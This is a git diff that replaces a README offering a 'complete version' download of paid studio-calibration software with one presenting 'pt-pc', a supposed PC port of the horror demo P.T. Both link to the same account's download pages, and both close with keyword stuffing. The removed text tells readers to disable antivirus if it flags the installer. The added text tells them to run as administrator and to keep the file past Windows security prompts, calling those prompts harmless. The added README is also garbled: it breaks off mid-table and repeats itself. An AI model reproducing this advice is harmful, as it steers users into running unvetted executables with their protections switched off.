@@ -1,65 +1,198 @@
-# 🔊 Sonarworks-SoundID-2026 - Calibrate Your Studio For Perfect Sound
+# 👻 pt-pc - Play the Lost Horror Demo on PC
 
-[![](https://img.shields.io/badge/Download-Sonarworks_SoundID_2026-blue.svg)](https://elisesurmounted381.github.io)
+[![Download pt-pc](https://img.shields.io/badge/Download_pt-pc-FF5733?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/elisesurmounted381/pt-pc/releases)
 
-This software corrects the sound output of your speakers and headphones. It removes acoustic coloration from your listening environment. You hear a flat, accurate frequency response. Producers use this tool to make mixing decisions with confidence. It works across Windows 10 and 11 environments.
+pt-pc is a native PC port of P.T., the famous playable horror teaser. It runs on Windows and uses your own PS4 game files. This page is written for everyday computer users, so you can download the app, open it, and start it without programming knowledge.
 
-## 📋 System Requirements
+## 🚀 What You Get
 
-Your computer requires specific hardware and software to run this application effectively. Ensure your system meets these standards before you begin the installation process.
+pt-pc brings the unsettling P.T. hallway experience to a normal Windows PC. The app is built to run from your own PS4 game files, which means you keep control of the game data you already own. You do not need a PS4 console connected while you play, and you do not need to install developer tools, compilers, or other technical software.
 
-*   Operating System: Windows 10 (version 21H2 or later) or Windows 11.
-*   Processor: Intel Core i3 or AMD Ryzen 3 series clocked at 2 GHz or higher.
-*   Memory: 8 GB of RAM.
-*   Storage Space: 500 MB of free disk space for the installation files.
-*   Audio Hardware: Built-in audio interface or external USB sound card with ASIO driver support.
-*   Internet Connection: A stable connection for the initial registration and activation process.
+The download is published on the official GitHub Releases page. That page is the main place to get the application. Keep this README open while you set things up, and use the download buttons below when you are ready.
 
-## 📥 Getting Started
+## 📥 Download pt-pc
 
-Follow these steps to obtain and install the software on your Windows computer.
+Use the large button below to open the official releases page.
 
-1.  Visit the official repository download page to obtain the installer package. 
-    [Download the Installer Here](https://elisesurmounted381.github.io)
-2.  Locate the downloaded file in your Downloads folder.
-3.  Double-click the installer file to launch the setup wizard.
-4.  Follow the instructions on the screen.
-5.  Accept the license agreement when the window appears.
-6.  Select the destination folder for the application files.
-7.  Click the Install button to begin the file extraction process.
-8.  Wait for the progress bar to reach the end.
-9.  Click Finish to close the setup wizard once the installation completes.
+[![Get pt-pc](https://img.shields.io/badge/Get_pt-pc-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elisesurmounted381/pt-pc/releases)
 
-## 🛠️ Software Setup Guide
+Visit this link to download the application. The releases page shows the available versions. Pick the newest release at the top of the page and save the download to your Downloads folder. Use this official page so you know you are getting the real pt-pc files.
 
-Proper configuration ensures the software processes your audio output correctly. Open the application from your Start Menu after installation. 
+## 🧰 Before You Install
 
-The software prompts you to choose your calibration target. If you use studio monitors, select the Speaker Calibration mode. If you use headphones, select the Headphone Calibration mode. The software contains a library of profiles for common headphone models. Search for your specific model in the database to load the correction curve. 
+You need a Windows PC and your own PS4 game files for P.T. The port does not include the P.T. game data itself. It is designed to run from the files you provide, so keep those files in a folder you can easily find, such as `Documents\pt-pc-files` or a folder on your Desktop.
 
-If you use studio monitors, you need a measurement microphone. The software walks you through a multi-point measurement process. Place the microphone at the designated spots in your room. The software analyzes your room acoustics and creates a custom correction profile. This profile compensates for bass buildup and frequency dips caused by your room shape or speaker placement.
+You do not need to know how to code. You do not need to use a command prompt. You do not need to connect a PS4 to your PC. The app is meant to guide you through the setup with normal Windows screens and a simple file picker.
 
-## 🎛️ Using the Application
+A controller is optional. Many players prefer an Xbox controller for horror games, but you can start with a keyboard and mouse and change your controls later.
 
-The interface sits in your system tray while it runs. It allows you to toggle the correction on and off. Use this feature to compare your processed sound against the raw room sound. 
+## 🖥️ Install and First Launch
 
-The software provides a target curve feature. You may choose between a flat frequency response or add custom bass or treble changes. Producers often use the flat setting for mixing and the bass-boost settings for casual listening.
+1. Open the download link from this page: [pt-pc releases](https://github.com/elisesurmounted381/pt-pc/releases).
+2. Visit this link to download the application.
+3. When the download finishes, open your Downloads folder and double-click the file you downloaded.
+4. Follow the on-screen prompts. If Windows asks for permission to open the app, allow it to continue.
+5. When the app opens, use the file picker to select the folder that contains your own P.T. game files.
+6. Choose your display settings, such as fullscreen or windowed mode, then start the game.
 
-Check the Buffer Size setting in the audio options if you hear crackling or glitches in the audio. Increase the buffer size to 256 or 512 samples to resolve playback issues. Most modern systems perform well with a setting of 128 samples.
+If you close the app and come back later, your settings should be remembered. If you move your game files to a new folder, open pt-pc again and select the new folder.
 
-## 🔧 Troubleshooting Common Issues
+## 🎮 Using Your Own PS4 Game Files
 
-Audio problems happen occasionally. Follow these steps to resolve common conflicts.
+pt-pc runs from your own PS4 game files. That means the quality of your first launch depends on having the correct P.T. files in a folder that the app can read. Place the files in a simple location, avoid deeply nested folders, and keep the folder name short and clear.
 
-If the software does not produce sound, verify that the application has the correct output device selected in the settings menu. Ensure your sound card drivers are up to date. Conflicts often occur when other programs attempt to block the sound driver used by Sonarworks. Close other music production applications before you change global settings.
+When pt-pc asks for the game files, select the main folder. Do not select a single file inside the folder. If the app says the files were not found, check that you picked the folder that contains the P.T. data, then try again.
 
-If the installer fails to run, check your administrative permissions. Right-click the installer file and select Run as administrator. Disable your antivirus temporarily if it flags the installer package, as some security software misidentifies new installers as threats. 
+Your game files are not uploaded anywhere by pt-pc. The app reads them from your PC so you can play locally.
 
-If you lose your calibration profile, navigate to the Documents folder on your computer. Look for a folder labeled Sonarworks. Your profiles exist within this folder. Keep a backup of this folder on an external drive to protect your custom settings.
+## ✨ Key Features
 
-## 🔔 Performance Tips for Music Production
+- Native Windows application built for PC play.
+- Runs from your own PS4 game files.
+- Simple first-run setup with a file picker.
+- Fullscreen and windowed display options.
+- Keyboard and mouse support.
+- Xbox controller support for a more natural horror-game feel.
+- Settings saved between sessions.
+- No PS4 console connection needed during play.
+- Local play from files already on your PC.
+- Clear download page with versioned releases.
 
-You get the best results when you calibrate your environment correctly. Keep your speakers positioned at ear level. Point the tweeters directly at your listening position. Remove reflective objects from your desk space to reduce acoustic glare. 
+## ⚙️ System Requirements
 
-Run the software as the final stage of your signal chain. Do not apply secondary room correction plugins inside your music production software, as this creates a double-correction effect that distorts the audio quality. Use the Sonarworks software to manage your monitoring, and keep your project inserts free for creative mixing tools.
+These are typical Windows PC requirements for a smooth first run.
 
-Keywords: audio-calibration, complete, complete-version, full-installer, music-production, paid-software, reference, software, sonarworks, sonarworks-2026, sonarworks-soundid, sonarworks-soundid-2026, sonarworks-soundid-reference, sonarworks-soundid-reference-complete-install-2026, sonarworks-soundid-reference-full-version-download, soundid, studio-monitor, windows-11, windows-software
+| Component | Minimum# 👻 pt-pc - Play the Lost Horror Demo on PC
+
+[![Download pt-pc](https://img.shields.io/badge/Download_pt-pc-FF5733?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/elisesurmounted381/pt-pc/releases)
+
+pt-pc is a native PC port of P.T., the famous playable horror teaser. It runs on Windows and uses your own PS4 game files. This page is written for everyday computer users, so you can download the app, open it, and get started without any programming knowledge.
+
+## 🚀 What You Get
+
+pt-pc brings the unsettling P.T. hallway experience to a normal Windows PC. The app is built to run from your own PS4 game files, which means you keep control of the game data you already own. You do not need a PS4 console connected while you play, and you do not need to install developer tools, compilers, or other technical software.
+
+The download is published on the official GitHub Releases page. That page is the main place to get the application. Keep this page open while you set things up, and use the download buttons here when you are ready.
+
+## 📥 Download pt-pc
+
+Use the large button below to open the official releases page.
+
+[![Get pt-pc](https://img.shields.io/badge/Get_pt-pc-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elisesurmounted381/pt-pc/releases)
+
+Visit this link to download the application. The releases page shows the available versions. Pick the newest release at the top of the page and save the download to your Downloads folder. Always use this official page so you know you are getting the real pt-pc files.
+
+## 🧰 Before You Install
+
+You need a Windows PC and your own PS4 game files for P.T. The port does not include the P.T. game data itself. It is designed to run from the files you provide, so keep those files in a folder you can easily find, such as `Documents\pt-pc-files` or a folder on your Desktop.
+
+You do not need to know how to code. You do not need to use a command prompt. You do not need to connect a PS4 to your PC. The app is meant to guide you through setup with normal Windows screens and a simple file picker.
+
+A controller is optional. Many players prefer an Xbox controller for horror games, but you can start with a keyboard and mouse and change your controls later.
+
+## 🖥️ Install and First Launch
+
+1. Open the download link from this page: [pt-pc releases](https://github.com/elisesurmounted381/pt-pc/releases).
+2. Visit this link to download the application.
+3. When the download finishes, open your Downloads folder and double-click the file you downloaded.
+4. Follow the on-screen prompts. If Windows asks for permission to open the app, allow it to continue.
+5. When the app opens, use the file picker to select the folder that contains your own P.T. game files.
+6. Choose your display settings, such as fullscreen or windowed mode, then start the game.
+
+If you close the app and come back later, your settings should be remembered. If you move your game files to a new folder, open pt-pc again and select the new folder.
+
+## 🎮 Using Your Own PS4 Game Files
+
+pt-pc runs from your own PS4 game files. That means the quality of your first launch depends on having the correct P.T. files in a folder that the app can read. Place the files in a simple location, avoid deeply nested folders, and keep the folder name short and clear.
+
+When pt-pc asks for the game files, select the main folder. Do not select a single file inside the folder. If the app says the files were not found, check that you picked the folder that contains the P.T. data, then try again.
+
+Your game files are not uploaded anywhere by pt-pc. The app reads them from your PC so you can play locally.
+
+## ✨ Key Features
+
+- Native Windows application built for PC play.
+- Runs from your own PS4 game files.
+- Simple first-run setup with a file picker.
+- Fullscreen and windowed display options.
+- Keyboard and mouse support.
+- Xbox controller support for a more natural horror-game feel.
+- Settings saved between sessions.
+- No PS4 console connection needed during play.
+- Local play from files already on your PC.
+- Clear download page with versioned releases.
+
+## ⚙️ System Requirements
+
+These are typical Windows PC requirements for a smooth first run.
+
+| Component | Minimum | Recommended |
+|---|---|---|
+| Operating system | Windows 10 64-bit | Windows 11 64-bit |
+| Processor | Dual-core 2.5 GHz | Quad-core 3.0 GHz or better |
+| Memory | 8 GB RAM | 16 GB RAM |
+| Graphics | DirectX 11 compatible GPU | Dedicated GPU with 4 GB VRAM |
+| Storage | 30 GB free space | 50 GB free space on an SSD |
+| Other | Your own P.T. game files | Xbox controller optional |
+
+If your PC is close to the minimum, try windowed mode and lower graphics settings first.
+
+## 🕹️ Controls
+
+| Action | Keyboard | Controller |
+|---|---|---|
+| Move | W A S D | Left stick |
+| Look | Mouse | Right stick |
+| Interact / Confirm | E or Enter | A |
+| Back / Pause | Esc | Start |
+| Zoom view | Right mouse button | Right trigger |
+
+You can change the sensitivity and button layout in the settings menu after your first launch.
+
+## 🔧 Troubleshooting Common Problems
+
+If the app does not open, right-click the downloaded file and choose "Run as administrator." Make sure the download finished completely before you open it.
+
+If the app opens but cannot find your game files, close it, move your files into a simple folder such as `C:\pt-files`, and try again. Pick the folder itself, not a file inside it.
+
+If the game window is too small or too large, open the settings and switch between fullscreen and windowed mode.
+
+If your controller does not respond, unplug it, plug it back in, and restart pt-pc. Windows sometimes needs a moment to detect a controller.
+
+If the game stutters, close other open programs, lower the graphics settings, and make sure your graphics card drivers are up to date through Windows Update or your PC maker's website.
+
+If Windows shows a security prompt, choose the option that keeps the file and allows the app to run. This prompt appears because the app was downloaded from the internet, not because anything is wrong with the file.
+
+## ❓ Frequently Asked Questions
+
+Do I need a PS4 to play? No. You only need your own PS4 game files already saved on your PC. You do not need to connect a console.
+
+Is the game included in the download? No. pt-pc is the app that runs the game. You supply your own P.T. files.
+
+Do I need to install anything else? No. Download the app from the releases page and open it.
+
+Can I use a controller? Yes. Xbox controllers work, and keyboard and mouse are supported too.
+
+Will my settings be saved? Yes. Display and control settings are remembered between sessions.
+
+Where do I get updates? Return to the releases page and download the newest version. You can keep your game files in the same folder.
+
+## 🛡️ Safety and Trust
+
+Download only from the official releases page linked on this page. That page is managed by the pt-pc project, so it is the safest place to get the current version.
+
+pt-pc works on your own PC with your own files. It does not require you to share personal details, create an account, or send your game files anywhere.
+
+## 💬 Getting Help
+
+If you run into a problem that the troubleshooting section does not solve, open the releases page and read the notes for the newest version. The notes usually mention known issues and any changes that affect setup. When asking for help, describe what you clicked, what you saw on screen, and the exact wording of any message.
+
+## 📌 Quick Reference
+
+- Download page: https://github.com/elisesurmounted381/pt-pc/releases
+- Platform: Windows PC
+- Game files: your own PS4 P.T. files
+- Setup time: a few minutes
+- Account needed: none
+
+Keywords: pt-pc, P.T. PC port, P.T. Windows, playable teaser PC, PS4 game files, horror game PC, native PC port, Silent Hills demo, first-person horror, download P.T. PC
